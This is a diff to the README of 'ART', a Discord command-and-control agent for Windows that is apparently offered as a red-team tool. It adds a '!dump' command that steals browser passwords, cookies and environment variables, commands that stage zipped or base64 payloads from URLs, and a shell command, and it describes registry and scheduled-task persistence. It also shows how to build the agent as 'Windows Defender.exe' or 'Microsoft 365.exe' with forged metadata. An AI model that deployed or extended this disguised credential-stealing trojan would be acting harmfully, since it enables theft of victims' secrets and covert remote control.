@@ -1,22 +1,37 @@
 # ART (Autonomous Red Teamer Discord C2 Agent: Complete Guide)
 
-[![Python Runtime 3.10+](https://img.shields.io/badge/Python%20Runtime-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![Python Build 3.13](https://img.shields.io/badge/Python%20Build-3.13-306998?style=for-the-badge&logo=python&logoColor=white)](build.bat)
-[![Build: PyInstaller](https://img.shields.io/badge/Build-PyInstaller-5A3E85?style=for-the-badge&logo=python&logoColor=white)](build.bat)
-[![Bootstrap: Supported](https://img.shields.io/badge/Bootstrap-Supported-1F883D?style=for-the-badge)](build.bat)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](#3-requirements)
-[![License: MIT](https://img.shields.io/badge/License-MIT-2EA44F?style=for-the-badge)](LICENSE)
-[![Documentation: Full Guide](https://img.shields.io/badge/Documentation-Full%20Guide-1F6FEB?style=for-the-badge&logo=readme&logoColor=white)](#table-of-contents)
-[![Legal Use: Authorized Labs Only](https://img.shields.io/badge/Legal%20Use-Authorized%20Labs%20Only-BD561D?style=for-the-badge)](DISCLAIMER.md)
-[![Audience: Students and Researchers](https://img.shields.io/badge/Audience-Students%20%26%20Researchers-6F42C1?style=for-the-badge&logo=bookstack&logoColor=white)](DISCLAIMER.md)
-[![Packaging: EXE Ready](https://img.shields.io/badge/Packaging-EXE%20Ready-0A7E8C?style=for-the-badge)](#12-step-7--build-a-standalone-exe)
-[![Contributing](https://img.shields.io/badge/Contributing-Guide-ffb000?style=for-the-badge&logo=github&logoColor=white)](CONTRIBUTING.md)
-[![Security](https://img.shields.io/badge/Security-Policy-d73a49?style=for-the-badge&logo=shield&logoColor=white)](SECURITY.md)
-[![Changelog](https://img.shields.io/badge/Changelog-Tracked-7a52c7?style=for-the-badge&logo=bookstack&logoColor=white)](CHANGELOG.md)
+<p align="center">
+   <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/Python%20Runtime-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python Runtime 3.10+" /></a>
+   <a href="build.bat"><img src="https://img.shields.io/badge/Build%20Python-3.13-306998?style=for-the-badge&logo=python&logoColor=white" alt="Build Python 3.13" /></a>
+   <a href="build.bat"><img src="https://img.shields.io/badge/Build-PyInstaller-5A3E85?style=for-the-badge&logo=python&logoColor=white" alt="Build PyInstaller" /></a>
+   <a href="build.bat"><img src="https://img.shields.io/badge/Bootstrap-Ready-1F883D?style=for-the-badge" alt="Bootstrap Ready" /></a>
+</p>
 
-> The ART of Offensive Security
->
-> Author: Gabriel Dakinah Vincent
+<p align="center">
+   <a href="#3-requirements"><img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform Windows" /></a>
+   <a href="#12-step-7--build-a-standalone-exe"><img src="https://img.shields.io/badge/Packaging-EXE%20Ready-0A7E8C?style=for-the-badge" alt="Packaging EXE Ready" /></a>
+   <a href="#table-of-contents"><img src="https://img.shields.io/badge/Documentation-Full%20Guide-1F6FEB?style=for-the-badge&logo=readme&logoColor=white" alt="Documentation Full Guide" /></a>
+   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-2EA44F?style=for-the-badge" alt="License MIT" /></a>
+</p>
+
+<p align="center">
+   <a href="DISCLAIMER.md"><img src="https://img.shields.io/badge/Legal%20Use-Authorized%20Labs%20Only-BD561D?style=for-the-badge" alt="Legal Use Authorized Labs Only" /></a>
+   <a href="DISCLAIMER.md"><img src="https://img.shields.io/badge/Audience-Students%20%26%20Researchers-6F42C1?style=for-the-badge&logo=bookstack&logoColor=white" alt="Audience Students and Researchers" /></a>
+   <a href="#3-requirements"><img src="https://img.shields.io/badge/Runtime-Deps%20Documented-8250DF?style=for-the-badge&logo=pypi&logoColor=white" alt="Runtime Dependencies Documented" /></a>
+   <a href="#18-supported-commands"><img src="https://img.shields.io/badge/Commands-Reference-BC4C00?style=for-the-badge&logo=gnubash&logoColor=white" alt="Command Reference" /></a>
+</p>
+
+<p align="center">
+   <strong>The ART of Offensive Security</strong><br />
+   Author: Gabriel Dakinah Vincent
+</p>
+
+<p align="center">
+   <strong>Windows-focused build, packaging, and operator reference for the ART project.</strong><br />
+   See <a href="DISCLAIMER.md">DISCLAIMER.md</a> for authorization, safety, and legal-use guidance.
+</p>
+
+---
 
 ## Table of Contents
 1. [Overview](#1-overview)
@@ -87,7 +102,7 @@ Each deployed agent carries its own unique bot token so multiple agents can be o
 | `requests` | HTTP file downloads via `!upload <url>` |
 | `openai` | Report generation and autonomous planning |
 | `aiofiles` | Non-blocking file writes for reports and large message artifacts |
-| `pycryptodome` | Required for decrypting browser passwords with `!dump password` |
+| `pycryptodome` | Required for decrypting Chromium browser passwords and cookies via `!dump` |
 
 Install runtime packages:
 ```bash
@@ -270,12 +285,20 @@ build_env\Scripts\activate.bat
 ```bat
 build.bat --bootstrap
 ```
+
+`build.bat` prefers `build_env\Scripts\python.exe` when that virtual environment exists. If it does not, the script falls back to `py -3.13` automatically.
+
 ### 3. Normal rebuilds after setup
 ```bat
 build.bat
 ```
 
+
 By default, `build.bat` uses `icons/Windows Defender.ico` if that file exists. Change `DEFAULT_ICON_NAME` in `build.bat` if you want a different default.
+
+<p align="center">
+   <img src="docs/images/build_Windows_Defender.exe.png" alt="Windows Defender EXE build" style="max-width:100%;height:auto;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08);" />
+</p>
 
 The output EXE name follows the resolved icon name by default. For example, the default icon produces `build\Windows Defender.exe`.
 
@@ -296,7 +319,12 @@ build.bat --icon "Microsoft 365.ico"
 
 That build will produce `build\my-icon.exe` unless you override the output name explicitly.
 
+
 For icon filenames, the EXE name follows the same basename by default. For example, `--icon "Microsoft 365.ico"` produces `build\Microsoft 365.exe`.
+
+<p align="center">
+   <img src="docs/images/build_Microsoft_365.exe.png" alt="Microsoft 365 EXE build" style="max-width:100%;height:auto;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08);" />
+</p>
 
 ### 4.1 Override the output EXE name
 ```bat
@@ -325,6 +353,43 @@ The build script will produce `build\<resolved-name>.exe`.
 Use `build.bat clean` to remove the previous build output before compiling again.
 
 The build script writes the final EXE to `build\<resolved-name>.exe` and keeps PyInstaller work files under `build\pyinstaller_work`.
+
+### 6. Advanced build switches
+
+If you do not pass any of the switches below, the existing behavior stays the same: `build.bat` still performs a one-file, windowed build, uses the resolved default icon, and writes the EXE to `build\<resolved-name>.exe`.
+
+| Switch | Purpose |
+|---|---|
+| `--python <path\|version>` | Use a specific `python.exe` or a `py` launcher selector such as `3.13` |
+| `--console` / `--windowed` | Choose a console-visible debug build or the default windowed build |
+| `--debug` / `--log-level <level>` | Increase PyInstaller verbosity for troubleshooting |
+| `--smoke-test` | Print output size and generate a `.sha256` checksum after a successful build |
+| `--version <x.y.z.w>` | Set Windows EXE version metadata |
+| `--company <name>` | Set `CompanyName` in the EXE version metadata |
+| `--product <name>` | Set `ProductName` and `FileDescription` in the EXE version metadata |
+| `--manifest <asInvoker\|highest\|admin>` | Set the requested Windows execution level |
+| `--requirements <file>` | Use an alternate requirements file during `--bootstrap` |
+| `--output-dir <path>` | Write the built EXE to a different directory |
+| `--archive` | Create a release zip containing the EXE and checksum |
+| `--sign-script "command"` | Run a post-build signing or release hook and append the EXE path |
+
+Example commands:
+
+```bat
+build.bat dry-run --python 3.13 --console --debug
+```
+
+```bat
+build.bat --version 1.2.3 --company "ART Labs" --product "ART Agent" --manifest admin
+```
+
+```bat
+build.bat clean --output-dir release --smoke-test --archive
+```
+
+```bat
+build.bat --sign-script "echo signing"
+```
 
 ---
 
@@ -434,8 +499,12 @@ The agent runs a background heartbeat loop:
 | `!cd <path>` | Change current working directory |
 | `!download <path>` | Exfiltrate a file from the victim |
 | `!upload <url|filename> [dest]` | Download a file from a URL or retrieve a file from `#payloads` to the victim machine |
+| `!upload --zip <archive.zip> [dest]` | Retrieve a zip archive from `#payloads` or a URL, then extract it after download |
+| `!upload --b64 <payload.b64> [dest]` | Retrieve a base64-encoded payload from `#payloads` or a URL, then decode it after download |
+| `!dump [password\|cookie\|env\|all]` | Collect browser passwords, browser cookies, environment variables, or all supported loot |
 | `!delete <path>` | Delete a file on the victim machine |
 | `!message <text>` | Display a Windows message box on the victim's screen |
+| `!shell <command>` | Run a shell command and return the output explicitly |
 | `!persist [setup|cleanup]` | Setup or remove persistence (Registry Run Key, Startup Shortcut, Scheduled Task) |
 | Any other text | Executed as a shell command via `subprocess` in the agent's current directory |
 
@@ -443,7 +512,38 @@ The agent runs a background heartbeat loop:
 >
 > Commands are only processed in the agent's assigned `#cmd-*` channel.
 
-### 18.1 Reporting And Mode Flow
+
+### 18.1 !upload Usage Examples
+
+**Standard file upload from #payloads:**
+
+```bash
+!upload myfile.txt
+```
+
+**Upload and decompress a large file:**
+
+```bash
+!upload --zip bigfile.zip
+```
+
+**Upload and base64-decode a binary file:**
+
+```bash
+!upload --b64 payload.dll.b64
+```
+
+**Upload from a URL:**
+
+```bash
+!upload https://example.com/tool.exe
+```
+
+All previous upload behaviors are preserved. The new flags are optional and only affect the downloaded payload. For `#payloads` workflows, stage the `.zip` or `.b64` file itself; for URL workflows, point the command at the archive or encoded payload URL.
+
+---
+
+### 18.2 Reporting And Mode Flow
 
 - `!report` works on demand and uploads the generated markdown report to `#reports`.
 - `!abort` forces the agent back to passive mode and immediately generates a report.
